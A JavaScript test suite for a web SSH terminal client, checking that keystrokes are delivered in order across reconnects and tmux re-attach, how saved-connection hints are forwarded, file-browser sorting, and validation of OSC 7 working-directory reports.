  ok(sent.length === 0, 'oversize input not sent; got ' + sent.length);
  ok(errs === 1, 'error surfaced exactly once; got ' + errs);
  cleanup(env);
});

test('queueInput still sends a large-but-under-cap paste', async () => {
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'input', response: {ok: true}},
  ]);
  const win = env.win; const log = env.log;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-ok';
  win.queueInput(p, 'y'.repeat(2 * 1024 * 1024));  // 2 MB < 8 MB cap
  await sleep(40);
  const sent = log.filter(e => e.action === 'input' && e.body && e.body.session_id === 'sid-ok');
  ok(sent.length === 1, '2 MB paste sent; got ' + sent.length);
  cleanup(env);
});

// Typed text arrived scrambled in production ("ecoh" for "echo"): every
// 10ms batch was its own /api/input, fired without waiting, and requests
// in flight together reach the PTY in whatever order the network and the
// backend's threads deliver them. The model below applies each request
// after a random "network" delay; only strict one-at-a-time sending keeps
// the order.
function inputServer(win, opts) {
  opts = opts || {};
  const st = {applied: '', inflight: 0, maxInflight: 0, bodies: [], calls: 0};
  const base = win.fetch;
  win.fetch = function(url, init) {
    const u = new URL(url, 'http://x/');
    if (u.searchParams.get('action') !== 'input') return base(url, init);
    const body = JSON.parse(init.body);
    st.calls++; st.inflight++; st.maxInflight = Math.max(st.maxInflight, st.inflight);
    const n = st.calls;
    const delay = opts.delay ? opts.delay(n) : 1 + Math.floor(Math.random() * 25);
    return new Promise((resolve, reject) => setTimeout(() => {
      st.inflight--;
      const r = opts.reply ? opts.reply(n, body) : null;
      if (r === 'neterr') { reject(new TypeError('Failed to fetch')); return; }
      if (r === 'hang') { st.inflight++; return; }
      if (r && r.status) {
        resolve({status: r.status, statusText: '', json: () => Promise.resolve({error: 'busy'})});
        return;
      }
      st.applied += body.data; st.bodies.push(body.data);
      resolve({status: 200, json: () => Promise.resolve({ok: true, alive: true})});
    }, delay));
  };
  return st;
}

test('input: keystrokes reach the PTY in the order typed, one request at a time', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-order';
  const st = inputServer(win);
  const text = 'echo the quick brown fox jumps over the lazy dog; ls -la /tmp\r';
  for (const c of text) { win.queueInput(p, c); await sleep(Math.random() < 0.5 ? 0 : 12); }
  for (let i = 0; i < 200 && st.applied.length < text.length; i++) await sleep(10);
  ok(st.applied === text, 'order kept; got ' + JSON.stringify(st.applied));
  ok(st.maxInflight === 1, 'never more than one input in flight; got ' + st.maxInflight);
  ok(st.calls < text.length, 'keys typed during a request are batched; ' + st.calls + ' requests for ' + text.length + ' keys');
  cleanup(env);
});

test('input: a busy (503) reply resends the same batch ahead of later keys', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-busy';
  const st = inputServer(win, {delay: () => 5, reply: n => n === 1 ? {status: 503} : null});
  win.queueInput(p, 'ab');
  await sleep(20);
  win.queueInput(p, 'cd');                 // typed while 'ab' waits to be resent
  for (let i = 0; i < 100 && st.applied.length < 4; i++) await sleep(10);
  ok(st.applied === 'abcd', 'resent batch first, nothing lost or doubled; got ' + JSON.stringify(st.applied));
  cleanup(env);
});

test('input: a network error is not retried (the write may have landed)', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-neterr';
  const st = inputServer(win, {delay: () => 5, reply: n => n === 1 ? 'neterr' : null});
  win.queueInput(p, 'x');
  await sleep(30);
  win.queueInput(p, 'y');
  for (let i = 0; i < 100 && st.applied.length < 1; i++) await sleep(10);
  await sleep(50);
  ok(st.applied === 'y', 'no resend after a network error, later keys still flow; got ' + JSON.stringify(st.applied));
  ok(st.calls === 2, 'two requests; got ' + st.calls);
  cleanup(env);
});

test('input: 404 (session gone) reconnects the pane instead of dropping keys silently', async () => {
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-new', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sid-dead'; p.host = 'h'; p.user = 'u'; p.polling = true;
  inputServer(win, {delay: () => 3, reply: () => ({status: 404})});
  win.queueInput(p, 'ls\r');
  for (let i = 0; i < 50 && !env.log.some(e => e.action === 'connect'); i++) await sleep(10);
  ok(env.log.some(e => e.action === 'connect'), 'reconnect started; log=' + env.log.map(e => e.action).join(','));
  ok(p.sid !== 'sid-dead', 'dead sid dropped; got ' + p.sid);
  p.polling = false;
  cleanup(env);
});

test('keepalive: 404 (session gone) reconnects instead of pinging a dead session forever', async () => {
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-new2', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sid-dead2'; p.host = 'h'; p.user = 'u'; p.polling = true;
  inputServer(win, {delay: () => 3, reply: () => ({status: 404})});
  const realSI = win.setInterval;
  let tick = null;
  win.setInterval = (fn, ms) => { if (ms === 30000) { tick = fn; return 1; } return realSI(fn, ms); };
  win.startKeepalive(p);
  win.setInterval = realSI;
  ok(typeof tick === 'function', 'keepalive armed');
  tick();
  for (let i = 0; i < 50 && !env.log.some(e => e.action === 'connect'); i++) await sleep(10);
  ok(env.log.some(e => e.action === 'connect'), 'reconnect started; log=' + env.log.map(e => e.action).join(','));
  ok(p.sid !== 'sid-dead2', 'dead sid dropped; got ' + p.sid);
  p.polling = false;
  cleanup(env);
});

function goneThenOk(win, newSid) {
  // /api/input: 404 for the dead sid, 200 (recorded) for any other.
  const st = {sent: []};
  const base = win.fetch;
  win.fetch = (url, init) => {
    if (!/action=input/.test(url)) return base(url, init);
    const b = JSON.parse(init.body);
    return sleep(3).then(() => {
      if (b.session_id !== newSid) return {status: 404, statusText: '', json: () => Promise.resolve({error: 'session not found'})};
      if (b.data) st.sent.push(b.data);
      return {status: 200, json: () => Promise.resolve({ok: true, alive: true})};
    });
  };
  win.fetch.__state = base.__state;
  return st;
}
const RECONNECT_PLAN = sid => [
  {action: 'config', response: {restrict_hosts: false, connections: []}},
  {action: 'connect', response: {session_id: sid, alive: true}, delay: 30},
  {action: 'resize', response: {ok: true}},
  {action: 'output', response: {data: '', alive: true}, delay: 20},
];

test('input: keys typed into an expired PERSISTENT session arrive after the re-attach', async () => {
  const env = await mkEnv(RECONNECT_PLAN('sid-back'));
  const win = env.win;
  win.EventSource = undefined;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sid-expired'; p.host = 'h'; p.user = 'u'; p.polling = true;
  p.persistent = true; p.slotId = 'slot1';
  const st = goneThenOk(win, 'sid-back');
  win.queueInput(p, 'ls -la');
  await sleep(25);
  win.queueInput(p, '\r');               // typed while it re-attaches
  for (let i = 0; i < 80 && p.sid !== 'sid-back'; i++) await sleep(10);
  ok(p.sid === 'sid-back', 're-attached; sid=' + p.sid);
  await sleep(60);
  // /api/connect answered, but ssh is still logging in: keys written
  // now are eaten by the login (seen in a real browser run).
  ok(st.sent.length === 0 && p.inputGate === true, 'held until tmux is up; sent=' + JSON.stringify(st.sent));
  const frame = t => win.handleOutputPayload(p, {data: Buffer.from(t, 'latin1').toString('base64'), alive: true}, 'sid-back');
  frame('gorevds@host password: ');
  await sleep(60);
  ok(st.sent.length === 0, 'the password prompt does not open the gate');
  frame('\x1b[?1049h\x1b[H\x1b[2Jtmux screen');
  for (let i = 0; i < 80 && st.sent.join('') !== 'ls -la\r'; i++) await sleep(10);
  ok(st.sent.join('') === 'ls -la\r', 'nothing lost, in order; got ' + JSON.stringify(st.sent));
  ok(!p.inputGate, 'gate open');
  win.queueInput(p, 'x');
  for (let i = 0; i < 40 && st.sent.length < 2; i++) await sleep(10);
  ok(st.sent.join('') === 'ls -la\rx', 'typing flows normally afterwards; got ' + JSON.stringify(st.sent));
  p.polling = false;
  cleanup(env);
});

test('input: keys are kept when the keepalive noticed the dead session first', async () => {
  // Seen in a real browser: the keepalive ping and the typed batch were
  // in flight together; the ping's 404 started the re-attach, and the
  // batch's own 404, a few ms later, found "not my session any more"
  // and the keys were dropped.
  const env = await mkEnv(RECONNECT_PLAN('sid-back2'));
  const win = env.win;
  win.EventSource = undefined;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sid-expired'; p.host = 'h'; p.user = 'u'; p.polling = true;
  p.persistent = true; p.slotId = 'slot1';
  const st = goneThenOk(win, 'sid-back2');
  win.queueInput(p, 'make test\r');
  await sleep(11);                                   // the batch is in flight
  win.handleOutputPayload(p, {error: 'session not found'}, 'sid-expired');   // someone else got the 404 first
  for (let i = 0; i < 80 && p.sid !== 'sid-back2'; i++) await sleep(10);
  win.handleOutputPayload(p, {data: Buffer.from('\x1b[?1049htmux', 'latin1').toString('base64'), alive: true}, 'sid-back2');
  for (let i = 0; i < 100 && !st.sent.length; i++) await sleep(10);
  ok(st.sent.join('') === 'make test\r', 'keys arrived after the re-attach; got ' + JSON.stringify(st.sent));
  p.polling = false;
  cleanup(env);
});

test('input: keys typed in the terminal WHILE a persistent pane re-attaches are kept', async () => {
  const env = await mkEnv(RECONNECT_PLAN('sid-back3'));
  const win = env.win;
  win.EventSource = undefined;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sid-expired'; p.host = 'h'; p.user = 'u'; p.polling = true;
  p.persistent = true; p.slotId = 'slot1';
  const st = goneThenOk(win, 'sid-back3');
  win.handleOutputPayload(p, {error: 'session not found'}, 'sid-expired');
  ok(!p.sid && p.connecting, 're-attaching');
  p.term._onDataCb('git status\r');          // through the terminal, as a keypress does
  for (let i = 0; i < 80 && p.sid !== 'sid-back3'; i++) await sleep(10);
  win.handleOutputPayload(p, {data: Buffer.from('\x1b[?1049htmux', 'latin1').toString('base64'), alive: true}, 'sid-back3');
  for (let i = 0; i < 100 && !st.sent.length; i++) await sleep(10);
  ok(st.sent.join('') === 'git status\r', 'kept and delivered; got ' + JSON.stringify(st.sent));
  p.polling = false;
  cleanup(env);
});

test('input: keys typed in the terminal of a disconnected pane go nowhere', async () => {
  const env = await mkEnv(RECONNECT_PLAN('sid-x'));
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  p.persistent = true;
  p.term._onDataCb('typed at a dead pane');
  ok(p.inputQueue.length === 0 && !p.flushTimer, 'nothing queued');
  ok(!env.log.some(e => e.action === 'input'), 'nothing sent');
  cleanup(env);
});

test('input: keys still waiting to be sent survive the moment the session is found gone', async () => {
  // Real browser, run 5 of 8: typed, and within the 10 ms before the
  // batch leaves, the keepalive's 404 ended the session and wiped them.
  const env = await mkEnv(RECONNECT_PLAN('sid-back4'));
  const win = env.win;
  win.EventSource = undefined;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sid-expired'; p.host = 'h'; p.user = 'u'; p.polling = true;
  p.persistent = true; p.slotId = 'slot1';
  const st = goneThenOk(win, 'sid-back4');
  p.term._onDataCb('docker ps\r');
  win.handleOutputPayload(p, {error: 'session not found'}, 'sid-expired');   // same tick
  for (let i = 0; i < 80 && p.sid !== 'sid-back4'; i++) await sleep(10);
  win.handleOutputPayload(p, {data: Buffer.from('\x1b[?1049htmux', 'latin1').toString('base64'), alive: true}, 'sid-back4');
  for (let i = 0; i < 100 && !st.sent.length; i++) await sleep(10);
  ok(st.sent.join('') === 'docker ps\r', 'delivered after the re-attach; got ' + JSON.stringify(st.sent));
  p.polling = false;
  cleanup(env);
});

test('input: keys for an expired NON-persistent session never reach the new shell', async () => {
  const env = await mkEnv(RECONNECT_PLAN('sid-fresh'));
  const win = env.win;
  win.EventSource = undefined;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sid-expired'; p.host = 'h'; p.user = 'u'; p.polling = true; p.persistent = false;
  const st = goneThenOk(win, 'sid-fresh');
  win.queueInput(p, 'rm -rf build');
  await sleep(20);
  win.queueInput(p, '\r');
  for (let i = 0; i < 60 && p.sid !== 'sid-fresh'; i++) await sleep(10);
  await sleep(60);
  ok(p.sid === 'sid-fresh', 'reconnected; sid=' + p.sid);
  ok(st.sent.length === 0, 'a different shell gets none of it; got ' + JSON.stringify(st.sent));
  win.queueInput(p, 'x');
  for (let i = 0; i < 40 && !st.sent.length; i++) await sleep(10);
  ok(st.sent.join('') === 'x', 'new keys flow, old ones are gone; got ' + JSON.stringify(st.sent));
  p.polling = false;
  cleanup(env);
});

test('input: typing on a disconnected pane is dropped, not sent after a later reconnect', async () => {
  const env = await mkEnv(RECONNECT_PLAN('sid-later'));
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  p.persistent = true;
  win.queueInput(p, 'typed at a dead pane');
  ok(p.inputQueue.length === 0, 'not queued; got ' + JSON.stringify(p.inputQueue));
  cleanup(env);
});

test('input: a recent key keeps the held queue alive even if an older one is stale', async () => {
  const env = await mkEnv(RECONNECT_PLAN('sid-mix'));
  const win = env.win;
  win.EventSource = undefined;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.host = 'h'; p.user = 'u'; p.persistent = true; p.sid = null; p.connecting = true;
  const st = goneThenOk(win, 'sid-mix');
  win.queueInput(p, '\r');
  p.inputQueuedAt = Date.now() - 25000;        // pressed 25 s ago
  win.queueInput(p, 'ls');                      // typed just now
  p.sid = 'sid-mix'; p.connecting = false;
  win.beginSessionIO(p);
  win.openInputGate(p);
  for (let i = 0; i < 50 && !st.sent.length; i++) await sleep(10);
  ok(st.sent.join('') === '\rls', 'nothing recent was thrown away; got ' + JSON.stringify(st.sent));
  p.polling = false;
  cleanup(env);
});

test('input: held keys older than INPUT_HOLD_MS are dropped at re-attach', async () => {
  const env = await mkEnv(RECONNECT_PLAN('sid-slow'));
  const win = env.win;
  win.EventSource = undefined;
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.host = 'h'; p.user = 'u'; p.persistent = true; p.sid = 'sid-slow';
  const st = goneThenOk(win, 'sid-slow');
  p.inputQueue = ['stale']; p.inputQueuedAt = Date.now() - 60000;
  win.beginSessionIO(p);
  win.openInputGate(p);
  await sleep(60);
  ok(st.sent.length === 0 && p.inputQueue.length === 0, 'stale keys dropped; sent=' + JSON.stringify(st.sent));
  p.polling = false;
  cleanup(env);
});

test('input: a request that never answers does not freeze typing', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.INPUT_STALL_MS = 80;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-hang';
  const st = inputServer(win, {delay: () => 5, reply: n => n === 1 ? 'hang' : null});
  win.queueInput(p, 'a');
  await sleep(20);
  win.queueInput(p, 'b');
  await sleep(40);
  ok(st.calls === 1, 'waits for the first while it is merely slow; got ' + st.calls);
  for (let i = 0; i < 50 && st.applied !== 'b'; i++) await sleep(10);
  ok(st.applied === 'b', 'typing resumes after the stall timeout; got ' + JSON.stringify(st.applied));
  cleanup(env);
});

// =====================================================================
test('buildConnectBody: vault card forwards the connection hint', async () => {
  // The saved connection name must ride in the vault POST so the server can
  // authorize the card against the exact prompt connection it was saved from
  // (server-side _resolve_saved_card_connection). Regression guard for the
  // original #74 drop where the vault branch returned before stamping it.
  const env = await mkEnv({});
  const {win} = env;
  const build = (extra) => win.buildConnectBody(
    Object.assign({vault_id: 'V', conn_id: 'C', vault_key: 'K', user: 'u',
                   cols: 80, rows: 24}, extra), 80, 24);

  const withHint = build({connection: 'prod-bastion'});
  ok(withHint.vault_id === 'V', 'vault tuple still shipped');
  ok(withHint.connection === 'prod-bastion',
     'connection hint forwarded; got ' + JSON.stringify(withHint.connection));

  const noHint = build({connection: null});
  ok(!('connection' in noHint),
     'no connection key when card has none; got ' + JSON.stringify(noHint));
  cleanup(env);
});

// =====================================================================
test('connectSaved: vault re-click forwards the connection hint (#74)', async () => {
  // The dominant flow — clicking a saved vault card after a page reload —
  // must send `connection` so the server can authorize by name. Regression
  // guard: connectSaved built the connect body without it, silently dropping
  // the hint on this path (buildConnectBody/paneRecord were fixed, but the
  // value never reached them here).
  const plan = [
    {action: 'config', response: {restrict_hosts: true, connections: [],
                                  vault_enabled: true}},
    {action: 'connect', response: {session_id: 's1', status: 'connecting',
                                    alive: true, auth_failed: false}},
  ];
  const env = await mkEnv(plan); const {win, log} = env;
  await win.eval('ensureVaultId()');   // seed vault_id + K so the
  await win.eval('ensureVaultKey()');  // no-key guard in connectSaved passes
  await win.connectSaved({
    name: 'card', conn_id: 'C'.repeat(26), host: 'h.ex', port: 22,
    user: 'root', connection: 'prod-bastion', persistent: false,
  });
  await sleep(80);
  const connects = log.filter(e => e.action === 'connect');
  ok(connects.length === 1, 'one /api/connect; got ' + connects.length);
  ok(connects[0].body.vault_id && connects[0].body.conn_id, 'vault tuple sent');
  ok(connects[0].body.connection === 'prod-bastion',
     'connection hint forwarded from saved row; got ' +
     JSON.stringify(connects[0].body.connection));
  cleanup(env);
});

// =====================================================================
test('paneRecord: vault pane carries the connection hint (#74)', async () => {
  // The connectPane (in-session reconnect / F5) path builds its body from
  // paneRecord(p); the vault branch must copy p.connection so the hint
  // survives a reconnect too.
  const env = await mkEnv({}); const {win} = env;
  const rec = win.paneRecord({
    conn_id: 'C'.repeat(26), connection: 'prod-bastion',
    host: 'h', port: 22, user: 'u', term: {cols: 80, rows: 24},
  });
  ok(rec.via === 'vault', 'vault rec; got ' + rec.via);
  ok(rec.connection === 'prod-bastion',
     'paneRecord carries connection; got ' + JSON.stringify(rec.connection));
  const recNone = win.paneRecord({
    conn_id: 'C'.repeat(26), host: 'h', port: 22, user: 'u',
    term: {cols: 80, rows: 24},
  });
  ok(recNone.connection === null,
     'null when pane has none; got ' + JSON.stringify(recNone.connection));
  cleanup(env);
});

test('badge/tag DOM is not rebuilt when pane state is unchanged', async () => {
  // updatePaneBadge runs on EVERY output frame; before the _badgeState
  // early-return, updatePaneTag removed and recreated the .pane-tag span
  // per frame — hundreds of element allocations/sec during noisy output.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sidT', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.1'; $(win, 'iU').value = 'alex';
  $(win, 'iPw').value = 'pw'; $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  ok(!!p, 'pane exists');
  win.updatePaneBadge(p);
  const tag1 = p.el.querySelector('.pane-tag');
  ok(!!tag1, 'tag rendered for a host-bearing pane');
  const badgeText1 = p.el.querySelector('[data-pane-badge]').textContent;
  win.updatePaneBadge(p);
  win.updatePaneBadge(p);
  const tag2 = p.el.querySelector('.pane-tag');
  ok(tag1 === tag2, 'same-state updates must not recreate the tag element');
  ok(p.el.querySelector('[data-pane-badge]').textContent === badgeText1,
     'badge text unchanged');
  // A real state change must still re-render:
  p.persistent = true;
  win.updatePaneBadge(p);
  const tag3 = p.el.querySelector('.pane-tag');
  ok(!!tag3 && tag3 !== tag1, 'state change recreates the tag');
  ok(tag3.textContent === 'persistent',
     'tag reflects new state; got ' + (tag3 && tag3.textContent));
  cleanup(env);
});

test('document title follows the active pane across switches', async () => {
  // Regression for the _badgeState memo: title upkeep must live OUTSIDE
  // the memo, because activeId changes without the pane's own state
  // changing. A memoized skip left the previous pane's title behind.
  const env = await mkEnv(SEARCH_PANE_PLAN()); const win = env.win;
  const [a, b] = await _twoPanes(win);
  ok(!!a && !!b, 'two panes up');
  // B was connected last and is active; prime both memos.
  win.updatePaneBadge(a); win.updatePaneBadge(b);
  win.activatePane(a.id);
  ok(win.document.title.indexOf(a.label) === 0,
     'A active -> title is A; got ' + win.document.title);
  win.activatePane(b.id);
  ok(win.document.title.indexOf(b.label) === 0,
     'switch to B updates title; got ' + win.document.title);
  win.activatePane(a.id);
  ok(win.document.title.indexOf(a.label) === 0,
     'switch BACK to A updates title (stale-memo regression); got '
     + win.document.title);
  cleanup(env);
});

// =====================================================================
// File browser: open-at-cwd, sorting, delete
// =====================================================================

// A plan that connects one pane and answers /api/ls with `entries`.
const FB_PLAN = (entries, path) => ([
  {action: 'config', response: {restrict_hosts: false, connections: []}},
  {action: 'connect', response: {session_id: 'sa', alive: true}},
  {action: 'resize', response: {ok: true}},
  {action: 'output', response: {data: '', alive: true}},
  {action: 'ls', response: {path: path || '/home/alice', entries: entries || []}},
  {action: 'rm', response: {ok: true}},
  {action: 'mkdir', response: {ok: true}},
  {action: 'mv', response: {ok: true}},
  {action: 'disconnect', response: {ok: true}},
]);

// makeFetch's log records {action, body} but not the query string, and
// the pane-cwd flag rides in the query. Wrap fetch to keep the URLs.
function recordUrls(win) {
  const urls = [];
  const inner = win.fetch;
  win.fetch = function(url, init) { urls.push(String(url)); return inner(url, init); };
  return urls;
}

async function _onePane(win) {
  $(win, 'iH').value = 'a.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  return paneList(win)[0];
}

const FB_ENTRIES = [
  {name: 'zeta.txt',  type: 'f', size: 10,   mtime: 3000},
  {name: 'alpha.txt', type: 'f', size: 5000, mtime: 1000},
  {name: 'mid.txt',   type: 'f', size: 700,  mtime: 2000},
  {name: 'zdir',      type: 'd', size: 4096, mtime: 9000},
  {name: 'adir',      type: 'd', size: 4096, mtime: 8000},
];
const names = win => Array.from(
  $(win, 'fbList').querySelectorAll('.fb-nm')).map(n => n.textContent);
// Only the rows the user can actually see — excludes anything the
// dotfile toggle or the name filter has hidden with .fb-hide.
const visNames = win => Array.from(
  $(win, 'fbList').querySelectorAll('.fb-row'))
    .filter(r => !r.classList.contains('fb-hide') && r.querySelector('.fb-nm'))
    .map(r => r.querySelector('.fb-nm').textContent);
const rowFor = (win, n) => Array.from(
  $(win, 'fbList').querySelectorAll('.fb-row')).find(
    r => r.querySelector('.fb-nm') &&
         r.querySelector('.fb-nm').textContent === n);

test('file browser sorts newest-first by default, directories pinned on top', async () => {
  // The default exists because the reason to open the browser is
  // usually a file that was just written; alphabetical order buries it.
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  ok(!!p && !!p.sid, 'pane connected');
  win.showFileBrowser(p.id);
  await sleep(30);
  const got = names(win);
  ok(got[0] === '..', 'parent entry first; got ' + JSON.stringify(got));
  // Directories (mtime 9000, 8000) before files, each group newest-first.
  ok(JSON.stringify(got.slice(1)) ===
     JSON.stringify(['zdir', 'adir', 'zeta.txt', 'mid.txt', 'alpha.txt']),
     'dirs pinned, then files newest-first; got ' + JSON.stringify(got));
  cleanup(env);
});

test('file browser sort: name and size modes, and direction toggling', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);

  win.setFbSort('name'); await sleep(30);
  ok(JSON.stringify(names(win).slice(1)) ===
     JSON.stringify(['adir', 'zdir', 'alpha.txt', 'mid.txt', 'zeta.txt']),
     'name ascending; got ' + JSON.stringify(names(win)));
  ok(win.settings.fbSortDir === 1, 'switching to name starts ascending');

  // Clicking the active column flips it.
  win.setFbSort('name'); await sleep(30);
  ok(JSON.stringify(names(win).slice(1)) ===
     JSON.stringify(['zdir', 'adir', 'zeta.txt', 'mid.txt', 'alpha.txt']),
     'name descending after re-click; got ' + JSON.stringify(names(win)));

  win.setFbSort('size'); await sleep(30);
  ok(win.settings.fbSortDir === -1, 'switching to size starts descending');
  ok(JSON.stringify(names(win).slice(3)) ===
     JSON.stringify(['alpha.txt', 'mid.txt', 'zeta.txt']),
     'files largest-first; got ' + JSON.stringify(names(win)));
  cleanup(env);
});

test('file browser sort choice persists to settings', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  ok(win.settings.fbSort === 'mtime', 'default is date');
  win.setFbSort('size'); await sleep(30);
  const raw = win.localStorage.getItem(
    Object.keys(win.localStorage).find(k => k.indexOf('settings') >= 0));
  ok(raw && JSON.parse(raw).fbSort === 'size',
     'sort column written to localStorage; got ' + raw);
  cleanup(env);
});

test('file browser sort: equal keys fall back to name order', async () => {
  // A tarball unpacked in one second gives every file the same mtime.
  // Without the tiebreak the order is whatever the server happened to
  // send, which reshuffles between listings.
  const same = [
    {name: 'c.txt', type: 'f', size: 1, mtime: 5000},
    {name: 'a.txt', type: 'f', size: 1, mtime: 5000},
    {name: 'b.txt', type: 'f', size: 1, mtime: 5000},
  ];
  const env = await mkEnv(FB_PLAN(same)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  ok(JSON.stringify(names(win).slice(1)) ===
     JSON.stringify(['a.txt', 'b.txt', 'c.txt']),
     'identical mtimes break to name ascending; got ' + JSON.stringify(names(win)));
  cleanup(env);
});

test('OSC 7 tracks the remote working directory', async () => {
  const env = await mkEnv(FB_PLAN()); const win = env.win;
  const p = await _onePane(win);
  ok(p.cwd === '', 'cwd starts unknown');
  ok(p.term.parser._fireOsc(7, 'file://boxy/srv/app') === true,
     'OSC 7 is claimed');
  ok(p.cwd === '/srv/app', 'path extracted, host ignored; got ' + p.cwd);
  // Percent-encoding is normal in OSC 7 payloads.
  p.term.parser._fireOsc(7, 'file://boxy/srv/my%20dir');
  ok(p.cwd === '/srv/my dir', 'percent-decoded; got ' + p.cwd);
  // Junk from a hostile or broken remote must be declined, and must
  // not overwrite a good value.
  const before = p.cwd;
  ok(p.term.parser._fireOsc(7, 'http://boxy/etc') === false, 'non-file:// declined');
  ok(p.term.parser._fireOsc(7, 'file://boxy') === false, 'no path component declined');
  ok(p.term.parser._fireOsc(7, 'file://b/a%ZZ') === false, 'bad escape declined');
  ok(p.term.parser._fireOsc(7, 'file://b' + '/x'.repeat(4000)) === false,
     'oversize payload declined');
  ok(p.cwd === before, 'declined payloads left cwd untouched; got ' + p.cwd);
  cleanup(env);
});

test('OSC 7 from another host (nested ssh, cat of a file) does not move the cwd', async () => {
  const env = await mkEnv(FB_PLAN()); const win = env.win;
  const p = await _onePane(win);
  p.term.parser._fireOsc(7, 'file://prod/home/alice/app');
  ok(p.cwd === '/home/alice/app' && p.osc7Host === 'prod', 'first report pins the host');
  // `ssh db` inside the pane: the nested shell reports ITS directory.
  ok(p.term.parser._fireOsc(7, 'file://db/var/lib/postgresql') === true, 'consumed (not echoed)');
  ok(p.cwd === '/home/alice/app', 'foreign host ignored; got ' + p.cwd);
  // Back in the outer shell: its own reports apply again (host match is case-insensitive).
  p.term.parser._fireOsc(7, 'file://PROD/srv');
  ok(p.cwd === '/srv', 'own host applies again; got ' + p.cwd);
  // Query/fragment are not part of the path; control characters are refused.
  p.term.parser._fireOsc(7, 'file://prod/srv/www?x=1#frag');
  ok(p.cwd === '/srv/www', 'query/fragment stripped; got ' + p.cwd);
  ok(p.term.parser._fireOsc(7, 'file://prod/tmp/a%0Ab') === false, 'newline in path refused');
  ok(p.term.parser._fireOsc(7, 'file://prod/tmp/a%1Bb') === false, 'ESC in path refused');
  ok(p.cwd === '/srv/www', 'refused payloads left cwd untouched');
  // A new session re-learns its host.
  win.endSession(p, {});
  ok(p.osc7Host === null && p.cwd === '', 'endSession resets cwd and the pinned host');
  cleanup(env);
});

test('file browser opens at the OSC 7 cwd, without asking the server', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/srv/app')); const win = env.win;
  const p = await _onePane(win);
  p.term.parser._fireOsc(7, 'file://boxy/srv/app');
  const urls = recordUrls(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const ls = urls.find(u => u.indexOf('action=ls') >= 0);
  ok(!!ls, 'a listing was requested');
  ok(ls.indexOf(encodeURIComponent('/srv/app')) >= 0,
     'listing asked for the tracked cwd; got ' + ls);
  ok(ls.indexOf('cwd=1') < 0,
     'no server-side cwd resolution needed when OSC 7 already told us');
  cleanup(env);
});

test('file browser asks the server for the pane cwd when OSC 7 is silent', async () => {
  // Non-persistent shells that emit no OSC 7, and every pane before its
  // first prompt. The server can still answer for tmux-backed sessions.
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  ok(p.cwd === '', 'no OSC 7 seen');
  const urls = recordUrls(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const ls = urls.find(u => u.indexOf('action=ls') >= 0);
  ok(!!ls && ls.indexOf('cwd=1') >= 0,
     'falls back to server-side cwd resolution; got ' + ls);
  // The header must show where we actually landed, not the '~' we asked with.
  ok($(win, 'fbPath').textContent === '/home/alice',
     'header shows the resolved path; got ' + $(win, 'fbPath').textContent);
  cleanup(env);
});

test('disconnect clears the tracked cwd', async () => {
  // Otherwise a reconnect — which starts in $HOME, or on another host
  // entirely — would open the browser at the dead shell's directory.
  const env = await mkEnv(FB_PLAN()); const win = env.win;
  const p = await _onePane(win);
  p.term.parser._fireOsc(7, 'file://boxy/srv/app');
  ok(p.cwd === '/srv/app', 'cwd tracked');
  win.endSession(p, {});
